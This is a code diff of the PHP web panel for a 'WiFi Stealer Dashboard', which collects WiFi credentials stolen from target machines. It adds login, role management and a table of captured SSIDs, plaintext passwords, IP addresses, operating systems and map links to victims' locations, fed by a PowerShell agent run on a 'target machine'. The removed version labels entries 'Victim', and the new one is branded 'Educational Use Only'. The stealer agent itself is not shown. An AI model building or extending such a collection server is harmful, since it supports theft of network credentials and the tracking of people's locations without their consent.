+    border: 1px solid #1e293b; border-radius: 8px; padding: 10px; margin-bottom: 12px; }
+  .info-box strong { color: #818cf8; }
+</style>
 </head>
 <body>
-<div class="page">
-    <div class="page-header">
-        <div class="title-group">
-            <div class="title">WiFi Stealer Dashboard</div>
-            <div class="subtitle">
-                Captures: <?php echo h($totalCaptures); ?> • Timezone: IST
-            </div>
-            <div class="viewer-meta">
-                Logged in as <?php echo h($_SESSION['login_user'] ?? ''); ?> •
-                You are viewing from IP <?php echo h($viewerIP); ?> on <?php echo h($viewerOS); ?>
-            </div>
-        </div>
-        <div class="actions">
-            <a href="?action=export_csv" class="btn">Export CSV</a>
+<div class="card">
+  <div class="logo">
+    <div class="logo-icon">📡</div>
+    <div class="logo-text">WiFi Stealer</div>
+  </div>
+  <div class="subtitle">Cybersecurity Training Dashboard – Authorized Users Only</div>
 
-            <form class="upload-form" method="post" enctype="multipart/form-data">
-                <input type="hidden" name="action" value="import_csv">
-                <input type="file" name="csv_file" accept=".csv" required>
-                <button type="submit" class="btn btn-sm">Upload CSV</button>
-            </form>
+  <?php if ($loginError !== ''): ?>
+    <div class="alert-err">⚠️ <?php echo h($loginError); ?></div>
+  <?php endif; ?>
 
-            <button type="button" class="btn" id="auto-refresh-toggle"
-                    onclick="toggleAutoRefresh(!autoRefresh);">
-                Auto-refresh: OFF
-            </button>
+  <form method="post">
+    <input type="hidden" name="form_type" value="login">
+    <label for="username">Username</label>
+    <input type="text" id="username" name="username" required autocomplete="username">
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" required autocomplete="current-password">
+    <button type="submit" class="btn">🔐 Login</button>
+  </form>
 
-            <form method="post"
-                  onsubmit="return confirm('Delete ALL history? This cannot be undone.');"
-                  style="display:inline;">
-                <input type="hidden" name="action" value="clear_all">
-                <button type="submit" class="btn btn-danger">
-                    Clear all history
-                </button>
-            </form>
+  <div class="info-box" style="margin-top:16px">
+    <strong>🎓 Students:</strong> Use the credentials provided by your instructor.<br>
+    <strong>🛡️ Admin:</strong> Only authorized personnel can create accounts.
+  </div>
 
-            <a href="?action=logout" class="btn btn-sm btn-danger">Logout</a>
-        </div>
-    </div>
-
-    <?php if ($importStatus !== null): ?>
-        <div class="status <?php echo strpos($importStatus, 'Error') === 0 ? 'status-error' : 'status-ok'; ?>">
-            <?php echo h($importStatus); ?>
-        </div>
-    <?php endif; ?>
-
-    <div class="card">
-        <form method="get" style="display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:4px;">
-            <input type="text" name="vid" placeholder="Filter Victim ID"
-                   value="<?php echo h($filter_victim); ?>"
-                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
-            <input type="text" name="ssid" placeholder="Filter SSID"
-                   value="<?php echo h($filter_ssid); ?>"
-                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
-            <input type="text" name="ip" placeholder="Filter IP (LAN/Public)"
-                   value="<?php echo h($filter_ip); ?>"
-                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
-            <input type="text" name="os" placeholder="Filter OS"
-                   value="<?php echo h($filter_os_f); ?>"
-                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
-            <button type="submit" class="btn btn-sm">Apply filters</button>
-            <a href="<?php echo h($_SERVER['PHP_SELF']); ?>" class="btn btn-sm">Clear</a>
-        </form>
-    </div>
-
-    <div class="stats-grid">
-        <div class="stat-card">
-            <div class="stat-label">Total captures</div>
-            <div class="stat-value"><?php echo h($totalCaptures); ?></div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">Unique SSIDs</div>
-            <div class="stat-value"><?php echo h($uniqueSSIDs); ?></div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">Source IPs</div>
-            <div class="stat-value"><?php echo h($uniqueIPs); ?></div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">Avg password length</div>
-            <div class="stat-value"><?php echo h($avgPasswordLen); ?></div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">Weak passwords</div>
-            <div class="stat-value"><?php echo h($weakPercentage); ?>%</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">Rank</div>
-            <div class="stat-value" id="rank-label"></div>
-            <div style="margin-top:6px; background:#020617; border-radius:999px; overflow:hidden; height:8px;">
-                <div id="rank-bar"
-                     style="height:100%; width:0%; background:linear-gradient(90deg,#22c55e,#eab308,#f97316);">
-                </div>
-            </div>
-            <div id="rank-pct" style="font-size:11px; margin-top:3px; color:#9ca3af;"></div>
-        </div>
-    </div>
-
-    <div class="card">
-        <table>
-            <thead>
-            <tr>
-                <th>#</th>
-                <th>Victim</th>
-                <th>Time</th>
-                <th>SSID</th>
-                <th>Password</th>
-                <th>Len</th>
-                <th>Strength</th>
-                <th>Actions</th>
-            </tr>
-            </thead>
-            <tbody>
-            <?php if (empty($filteredEntries)): ?>
-                <tr>
-                    <td colspan="8" style="text-align:center; padding:12px; color:#9ca3af;">
-                        No captures yet.
-                    </td>
-                </tr>
-            <?php else: ?>
-                <?php foreach ($filteredEntries as $entry): ?>
-                    <tr>
-                        <td><?php echo h($entry['idx'] + 1); ?></td>
-                        <td><?php echo h($entry['victim_id']); ?></td>
-                        <td><?php echo h($entry['time']); ?></td>
-                        <td><?php echo h($entry['ssid']); ?></td>
-                        <td class="password"><?php echo h($entry['password']); ?></td>
-                        <td><?php echo h($entry['len']); ?></td>
-                        <td>
-                            <?php if ($entry['weak']): ?>
-                                <span class="badge badge-weak">weak</span>
-                            <?php else: ?>
-                                <span class="badge badge-ok">ok</span>
-                            <?php endif; ?>
-                        </td>
-                        <td>
-                            <button type="button"
-                                    class="btn btn-sm"
-                                    onclick="showDetails('<?php echo h($entry['idx']); ?>');">
-                                Details
-                            </button>
-
-                            <form method="post"
-                                  style="display:inline;"
-                                  onsubmit="return confirm('Delete this entry?');">
-                                <input type="hidden" name="action" value="delete_one">
-                                <input type="hidden" name="idx" value="<?php echo h($entry['log_index']); ?>">
-                                <button type="submit" class="btn btn-sm btn-danger">Delete</button>
-                            </form>
-                        </td>
-                    </tr>
-                <?php endforeach; ?>
-            <?php endif; ?>
-            </tbody>
-        </table>
-    </div>
-
-    <div id="details-box" class="card" style="margin-top:12px; display:none;">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
-            <div id="details-title" style="font-weight:600; font-size:14px;">Details of capture</div>
-            <button type="button" class="btn btn-sm btn-danger" onclick="hideDetails();">Close</button>
-        </div>
-        <div id="details-content" style="font-size:12px; line-height:1.6;"></div>
-    </div>
-
-    <div class="footer">
-        © 2026 WiFi Stealer Dashboard – Made By Zypher17
-    </div>
+  <div class="footer">© 2026 WiFi Stealer Dashboard – Made by Zypher17 | Educational Use Only</div>
 </div>
+</body>
+</html>
+<?php
+    exit;
+}
+
+// ──────────────────────────────────────────────────────────────
+//  LOGGED IN – DETERMINE WHICH TAB TO SHOW
+// ──────────────────────────────────────────────────────────────
+$currentUser  = $_SESSION['login_user'];
+$currentRole  = $_SESSION['role'] ?? 'student';
+$currentEmail = $_SESSION['email'] ?? '';
+$isAdmin      = ($currentRole === 'admin');
+$activeTab    = $_GET['tab'] ?? 'dashboard';
+
+// ──────────────────────────────────────────────────────────────
+//  LOAD CAPTURES
+// ──────────────────────────────────────────────────────────────
+$allCaptures  = [];
+$usersForView = [];
+
+if ($isAdmin && $activeTab === 'dashboard') {
+    // Admin sees ALL users' data, grouped by user
+    foreach (load_users() as $u) {
+        $logFile = user_log_file($u['username']);
+        if (!file_exists($logFile)) continue;
+        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        foreach ($lines as $line) {
+            $cap = parse_capture_line($line);
+            if ($cap) {
+                $cap['_owner'] = $u['username'];
+                $allCaptures[] = $cap;
+            }
+        }
+    }
+} else {
+    // Students see only their own log
+    $logFile = user_log_file($currentUser);
+    if (file_exists($logFile)) {
+        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        foreach ($lines as $line) {
+            $cap = parse_capture_line($line);
+            if ($cap) {
+                $cap['_owner'] = $currentUser;
+                $allCaptures[] = $cap;
+            }
+        }
+    }
+}
+
+// Sort newest first
+usort($allCaptures, fn($a, $b) => strcmp($b['time_raw'], $a['time_raw']));
+
+// De-duplicate (same SSID+pass per owner)
+$deduped = [];
+$seen    = [];
+foreach ($allCaptures as $cap) {
+    $key = $cap['_owner'] . '|' . $cap['ssid'] . '|' . $cap['password'];
+    if (!isset($seen[$key])) {
+        $seen[$key]  = true;
+        $deduped[]   = $cap;
+    }
+}
+
+$totalCaptures = count($deduped);
+$weakCount     = count(array_filter($deduped, fn($c) => $c['weak']));
+$uniqueSSIDs   = count(array_unique(array_column($deduped, 'ssid')));
+
+// Activity log (admin only)
+$activityLines = [];
+if ($isAdmin && $activeTab === 'activity') {
+    if (file_exists(ACTIVITY_LOG)) {
+        $raw = file(ACTIVITY_LOG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $activityLines = array_reverse($raw); // newest first
+    }
+}
+
+$allUsers = $isAdmin ? load_users() : [];
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>WiFi Stealer Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #020617; --bg2: #0b1120; --bg3: #0f172a;
+    --border: rgba(148,163,184,0.15);
+    --text: #e5e7eb; --muted: #6b7280; --accent: #4f46e5;
+    --green: #22c55e; --red: #ef4444; --yellow: #eab308;
+    --purple: #7c3aed;
+  }
+  body { font-family: system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+         background: var(--bg); color: var(--text); min-height: 100vh; }
+
+  /* ── SIDEBAR ── */
+  .sidebar {
+    position: fixed; left: 0; top: 0; bottom: 0; width: 200px;
+    background: var(--bg3); border-right: 1px solid var(--border);
+    display: flex; flex-direction: column; padding: 16px 0; z-index: 100;
+  }
+  .sidebar-logo { padding: 0 16px 16px; border-bottom: 1px solid var(--border); margin-bottom: 8px; }
+  .sidebar-logo .name { font-size: 15px; font-weight: 700; }
+  .sidebar-logo .role-badge {
+    display: inline-block; font-size: 10px; padding: 2px 7px; border-radius: 999px;
+    margin-top: 4px;
+    background: <?php echo $isAdmin ? 'rgba(124,58,237,.25)' : 'rgba(79,70,229,.2)'; ?>;
+    color: <?php echo $isAdmin ? '#c4b5fd' : '#818cf8'; ?>;
+    border: 1px solid <?php echo $isAdmin ? 'rgba(124,58,237,.4)' : 'rgba(79,70,229,.3)'; ?>;
+  }
+  .nav-item {
+    display: flex; align-items: center; gap: 10px; padding: 9px 16px;
+    font-size: 13px; color: var(--muted); text-decoration: none;
+    border-left: 3px solid transparent; transition: all .15s;
+  }
+  .nav-item:hover { color: var(--text); background: rgba(255,255,255,.04); }
+  .nav-item.active { color: var(--text); background: rgba(79,70,229,.12);
+                     border-left-color: var(--accent); }
+  .nav-spacer { flex: 1; }
+  .nav-user { padding: 12px 16px; border-top: 1px solid var(--border); font-size: 11px; color: var(--muted); }
+  .nav-user .uname { font-weight: 600; color: var(--text); font-size: 12px; }
+  .nav-user .email { font-size: 10px; word-break: break-all; }
+  .logout-link { display: block; margin-top: 8px; font-size: 12px; color: #f87171;
+                 text-decoration: none; }
+  .logout-link:hover { text-decoration: underline; }
+
+  /* ── MAIN ── */
+  .main { margin-left: 200px; padding: 24px; min-height: 100vh; }
+
+  /* ── PAGE HEADER ── */
+  .page-header { margin-bottom: 20px; }
+  .page-header h1 { font-size: 20px; font-weight: 700; }
+  .page-header p { font-size: 13px; color: var(--muted); margin-top: 4px; }
+
+  /* ── STAT CARDS ── */
+  .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px,1fr)); gap: 12px; margin-bottom: 22px; }
+  .stat-card {
+    background: var(--bg3); border: 1px solid var(--border); border-radius: 10px;
+    padding: 14px 16px;
+  }
+  .stat-card .label { font-size: 11px; color: var(--muted); margin-bottom: 6px; }
+  .stat-card .value { font-size: 24px; font-weight: 700; }
+  .stat-card .value.red { color: var(--red); }
+  .stat-card .value.green { color: var(--green); }
+  .stat-card .value.purple { color: #a78bfa; }
+
+  /* ── TABLE ── */
+  .table-wrap { overflow-x: auto; }
+  table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  thead th { background: var(--bg3); color: var(--muted); font-weight: 500;
+             padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--border); }
+  tbody tr { border-bottom: 1px solid rgba(148,163,184,.07); transition: background .1s; }
+  tbody tr:hover { background: rgba(255,255,255,.03); }
+  tbody td { padding: 9px 12px; vertical-align: middle; }
+  .badge {
+    display: inline-flex; align-items: center; gap: 4px;
+    font-size: 10px; padding: 2px 7px; border-radius: 999px;
+  }
+  .badge.weak { background: rgba(239,68,68,.15); color: #fca5a5; border: 1px solid rgba(239,68,68,.3); }
+  .badge.strong { background: rgba(34,197,94,.12); color: #86efac; border: 1px solid rgba(34,197,94,.25); }
+  .badge.admin-role { background: rgba(124,58,237,.2); color: #c4b5fd; border: 1px solid rgba(124,58,237,.35); }
+  .badge.student-role { background: rgba(79,70,229,.18); color: #818cf8; border: 1px solid rgba(79,70,229,.3); }
+  .badge.active { background: rgba(34,197,94,.12); color: #86efac; border: 1px solid rgba(34,197,94,.25); }
+  .badge.inactive { background: rgba(239,68,68,.12); color: #fca5a5; border: 1px solid rgba(239,68,68,.25); }
+
+  /* ── OWNER CHIP ── */
+  .owner-chip { display: inline-block; background: rgba(79,70,229,.15); color: #818cf8;
+    border: 1px solid rgba(79,70,229,.25); border-radius: 6px; padding: 1px 7px; font-size: 10px; }
+
+  /* ── PANEL ── */
+  .panel { background: var(--bg3); border: 1px solid var(--border); border-radius: 12px; padding: 20px; }
+  .panel-title { font-size: 14px; font-weight: 600; margin-bottom: 16px; }
+
+  /* ── FORM ── */
+  .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  .form-group { display: flex; flex-direction: column; gap: 5px; }
+  .form-group label { font-size: 12px; color: var(--muted); }
+  .form-group input, .form-group select {
+    padding: 8px 10px; border-radius: 8px; border: 1px solid #334155;
+    background: var(--bg2); color: var(--text); font-size: 13px; outline: none;
+    transition: border-color .2s;
+  }
+  .form-group input:focus, .form-group select:focus { border-color: var(--accent); }
+  .btn { display: inline-flex; align-items: center; gap: 6px; padding: 9px 18px;
+    border-radius: 8px; border: none; font-size: 13px; font-weight: 500;
+    cursor: pointer; transition: opacity .2s; }
+  .btn-primary { background: linear-gradient(135deg,var(--accent),var(--purple)); color: #fff; }
+  .btn-primary:hover { opacity: .85; }
+  .btn-danger { background: rgba(239,68,68,.18); color: #fca5a5; border: 1px solid rgba(239,68,68,.3); }
+  .btn-danger:hover { background: rgba(239,68,68,.3); }
+  .btn-sm { padding: 5px 12px; font-size: 11px; border-radius: 6px; }
+  .alert-err { font-size: 12px; color: #fca5a5; background: rgba(239,68,68,.1);
+    border: 1px solid rgba(239,68,68,.3); border-radius: 8px; padding: 10px 12px; margin-bottom: 14px; }
+  .alert-ok { font-size: 12px; color: #86efac; background: rgba(34,197,94,.08);
+    border: 1px solid rgba(34,197,94,.25); border-radius: 8px; padding: 10px 12px; margin-bottom: 14px; }
+
+  /* ── ACTIVITY LOG ── */
+  .log-line { font-family: monospace; font-size: 11px; padding: 5px 10px;
+    border-bottom: 1px solid rgba(255,255,255,.04); color: var(--muted); }
+  .log-line:nth-child(even) { background: rgba(255,255,255,.02); }
+  .log-line .ts { color: #4b5563; }
+  .log-line .user { color: #818cf8; font-weight: 600; }
+  .log-line .action { color: #fbbf24; }
+  .log-line .action.login { color: var(--green); }
+  .log-line .action.failed { color: var(--red); }
+  .log-line .action.logout { color: #60a5fa; }
+  .log-empty { color: var(--muted); font-size: 13px; padding: 20px; text-align: center; }
+
+  @media (max-width: 640px) {
+    .sidebar { display: none; }
+    .main { margin-left: 0; padding: 16px; }
+    .form-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ── SIDEBAR ── -->
+<nav class="sidebar">
+  <div class="sidebar-logo">
+    <div style="font-size:22px;margin-bottom:4px">📡</div>
+    <div class="name">WiFi Stealer</div>
+    <div class="role-badge"><?php echo h(strtoupper($currentRole)); ?></div>
+  </div>
+
+  <a href="?tab=dashboard" class="nav-item <?php echo $activeTab==='dashboard'?'active':''; ?>">
+    📊 Dashboard
+  </a>
+
+  <?php if ($isAdmin): ?>
+  <a href="?tab=users" class="nav-item <?php echo $activeTab==='users'?'active':''; ?>">
+    👥 Manage Users
+  </a>
+  <a href="?tab=activity" class="nav-item <?php echo $activeTab==='activity'?'active':''; ?>">
+    📋 Activity Log
+  </a>
+  <a href="admin.php" class="nav-item" style="color:#fca5a5">
+    🛡️ Full Admin Panel
+  </a>
+  <?php endif; ?>
+
+  <div class="nav-spacer"></div>
+  <div class="nav-user">
+    <div class="uname">👤 <?php echo h($currentUser); ?></div>
+    <div class="email"><?php echo h($currentEmail); ?></div>
+    <a href="?action=logout" class="logout-link">⏻ Logout</a>
+  </div>
+</nav>
+
+<!-- ── MAIN CONTENT ── -->
+<main class="main">
+
+<?php if ($activeTab === 'dashboard'): ?>
+<!-- ────────────────── DASHBOARD TAB ────────────────── -->
+<div class="page-header">
+  <h1>📊 Captured WiFi Credentials</h1>
+  <p><?php echo $isAdmin ? 'Admin view – showing captures from ALL students.' : "Showing your captured WiFi data."; ?></p>
+</div>
+
+<div class="stats-grid">
+  <div class="stat-card">
+    <div class="label">Total Captures</div>
+    <div class="value purple"><?php echo $totalCaptures; ?></div>
+  </div>
+  <div class="stat-card">
+    <div class="label">Weak Passwords</div>
+    <div class="value red"><?php echo $weakCount; ?></div>
+  </div>
+  <div class="stat-card">
+    <div class="label">Unique SSIDs</div>
+    <div class="value green"><?php echo $uniqueSSIDs; ?></div>
+  </div>
+  <?php if ($isAdmin): ?>
+  <div class="stat-card">
+    <div class="label">Total Students</div>
+    <div class="value"><?php echo count(array_filter(load_users(), fn($u) => $u['role']==='student')); ?></div>
+  </div>
+  <?php endif; ?>
+</div>
+
+<div class="panel">
+  <div class="panel-title">Captured Credentials</div>
+  <?php if (empty($deduped)): ?>
+    <div class="log-empty">No captures yet. Run the PowerShell agent on a target machine.</div>
+  <?php else: ?>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <?php if ($isAdmin): ?><th>Student</th><?php endif; ?>
+          <th>Time</th>
+          <th>SSID</th>
+          <th>Password</th>
+          <th>Strength</th>
+          <th>IP</th>
+          <th>OS</th>
+          <th>Location</th>
+        </tr>
+      </thead>
+      <tbody>
+        <?php foreach ($deduped as $cap): ?>
+        <tr>
+          <?php if ($isAdmin): ?>
+          <td><span class="owner-chip"><?php echo h($cap['_owner']); ?></span></td>
+          <?php endif; ?>
+          <td><?php echo h($cap['time']); ?></td>
+          <td><strong><?php echo h($cap['ssid']); ?></strong></td>
+          <td><code><?php echo h($cap['password']); ?></code></td>
+          <td>
+            <?php if ($cap['password'] === '(Not Found)'): ?>
+              <span class="badge" style="background:rgba(107,114,128,.15);color:#9ca3af;border:1px solid #374151">N/A</span>
+            <?php elseif ($cap['weak']): ?>
+              <span class="badge weak">⚠ Weak</span>
+            <?php else: ?>
+              <span class="badge strong">✔ Strong</span>
+            <?php endif; ?>
+          </td>
+          <td><?php echo h($cap['ip_main']); ?></td>
+          <td><?php echo h($cap['os']); ?></td>
+          <td>
+            <?php if ($cap['latitude'] !== 'N/A' && $cap['longitude'] !== 'N/A'): ?>
+              <a href="https://maps.google.com/?q=<?php echo h($cap['latitude'].','. $cap['longitude']); ?>"
+                 target="_blank" style="color:#818cf8;font-size:11px">📍 Map</a>
+            <?php else: echo 'N/A'; endif; ?>
+          </td>
+        </tr>
+        <?php endforeach; ?>
+      </tbody>
+    </table>
+  </div>
+  <?php endif; ?>
+</div>
+
+<?php elseif ($isAdmin && $activeTab === 'users'): ?>
+<!-- ────────────────── USERS TAB (ADMIN) ────────────────── -->
+<div class="page-header">
+  <h1>👥 Manage Users</h1>
+  <p>Create student accounts and manage access. Each student sees only their own captured data.</p>
+</div>
+
+<!-- Create User Form -->
+<div class="panel" style="margin-bottom:20px">
+  <div class="panel-title">➕ Create New User</div>
+  <?php if ($registerError !== ''): ?><div class="alert-err"><?php echo h($registerError); ?></div><?php endif; ?>
+  <?php if ($registerSuccess !== ''): ?><div class="alert-ok">✔ <?php echo h($registerSuccess); ?></div><?php endif; ?>
+  <form method="post">
+    <input type="hidden" name="form_type" value="create_user">
+    <div class="form-grid">
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" name="new_username" required placeholder="e.g. student01" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <label>Password (min 8 chars)</label>
+        <input type="password" name="new_password" required autocomplete="new-password">
+      </div>
+      <div class="form-group">
+        <label>Email Address</label>
+        <input type="email" name="new_email" required placeholder="student@college.edu">
+      </div>
+      <div class="form-group">
+        <label>Role</label>
+        <select name="new_role">
+          <option value="student">Student</option>
+          <option value="admin">Admin</option>
+        </select>
+      </div>
+    </div>
+    <button type="submit" class="btn btn-primary" style="margin-top:14px">➕ Create User</button>
+  </form>
+</div>
+
+<!-- User List -->
+<div class="panel">
+  <div class="panel-title">All Users</div>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>Username</th>
+          <th>Email</th>
+          <th>Role</th>
+          <th>Status</th>
+          <th>Created At</th>
+          <th>Created By</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody>
+        <?php foreach ($allUsers as $u): ?>
+        <tr>
+          <td><strong><?php echo h($u['username']); ?></strong>
+            <?php if ($u['username'] === $currentUser): ?>
+              <span style="font-size:10px;color:#6b7280"> (you)</span>
+            <?php endif; ?>
+          </td>
+          <td><?php echo h($u['email'] ?? '-'); ?></td>
+          <td>
+            <span class="badge <?php echo $u['role']==='admin'?'admin-role':'student-role'; ?>">
+              <?php echo h($u['role']); ?>
+            </span>
+          </td>
+          <td>
+            <span class="badge <?php echo ($u['active']??true) ? 'active':'inactive'; ?>">
+              <?php echo ($u['active']??true) ? '● Active' : '○ Disabled'; ?>
+            </span>
+          </td>
+          <td><?php echo h(date('d M Y', strtotime($u['created_at'] ?? 'now'))); ?></td>
+          <td><?php echo h($u['created_by'] ?? 'setup'); ?></td>
+          <td>
+            <?php if ($u['username'] !== $currentUser): ?>
+            <form method="post" style="display:inline">
+              <input type="hidden" name="form_type" value="toggle_user">
+              <input type="hidden" name="target_username" value="<?php echo h($u['username']); ?>">
+              <button type="submit" class="btn btn-sm" style="background:rgba(234,179,8,.12);color:#fde047;border:1px solid rgba(234,179,8,.3)">
+                <?php echo ($u['active']??true) ? '🔒 Disable' : '🔓 Enable'; ?>
+              </button>
+            </form>
+            <form method="post" style="display:inline" onsubmit="return confirm('Delete user <?php echo h($u['username']); ?>? This cannot be undone.')">
+              <input type="hidden" name="form_type" value="delete_user">
+              <input type="hidden" name="target_username" value="<?php echo h($u['username']); ?>">
+              <button type="submit" class="btn btn-sm btn-danger">🗑 Delete</button>
+            </form>
+            <?php else: ?>
+            <span style="font-size:11px;color:var(--muted)">—</span>
+            <?php endif; ?>
+          </td>
+        </tr>
+        <?php endforeach; ?>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<?php elseif ($isAdmin && $activeTab === 'activity'): ?>
+<!-- ────────────────── ACTIVITY LOG TAB (ADMIN) ────────────────── -->
+<div class="page-header">
+  <h1>📋 Activity Log</h1>
+  <p>Every login attempt, logout, and user management action is recorded here.</p>
+</div>
+<div class="panel">
+  <div class="panel-title">Recent Events (newest first)</div>
+  <?php if (empty($activityLines)): ?>
+    <div class="log-empty">No activity recorded yet.</div>
+  <?php else: ?>
+    <?php foreach ($activityLines as $line):
+        $parts = explode(' | ', $line, 5);
+        $ts     = $parts[0] ?? '';
+        $uname  = $parts[1] ?? '';
+        $ip     = $parts[2] ?? '';
+        $action = $parts[3] ?? '';
+        $detail = $parts[4] ?? '';
+        $actionClass = match(true) {
+            str_contains($action,'LOGIN') && !str_contains($action,'FAILED') => 'login',
+            str_contains($action,'FAILED') => 'failed',
+            str_contains($action,'LOGOUT') => 'logout',
+            default => ''
+        };
+    ?>
+    <div class="log-line">
+      <span class="ts"><?php echo h($ts); ?></span>
+      &nbsp;│&nbsp;
+      <span class="user"><?php echo h($uname); ?></span>
+      &nbsp;│&nbsp;
+      <span style="color:#4b5563"><?php echo h($ip); ?></span>
+      &nbsp;│&nbsp;
+      <span class="action <?php echo $actionClass; ?>"><?php echo h($action); ?></span>
+      <?php if ($detail !== ''): ?>
+        &nbsp;│&nbsp;<span style="color:#374151"><?php echo h($detail); ?></span>
+      <?php endif; ?>
+    </div>
+    <?php endforeach; ?>
+  <?php endif; ?>
+</div>
+
+<?php else: ?>
+<!-- Fallback – redirect students away from admin tabs -->
+<?php header('Location: ' . $_SERVER['PHP_SELF']); exit; ?>
+<?php endif; ?>
+
+</main>
 </body>
 </html>
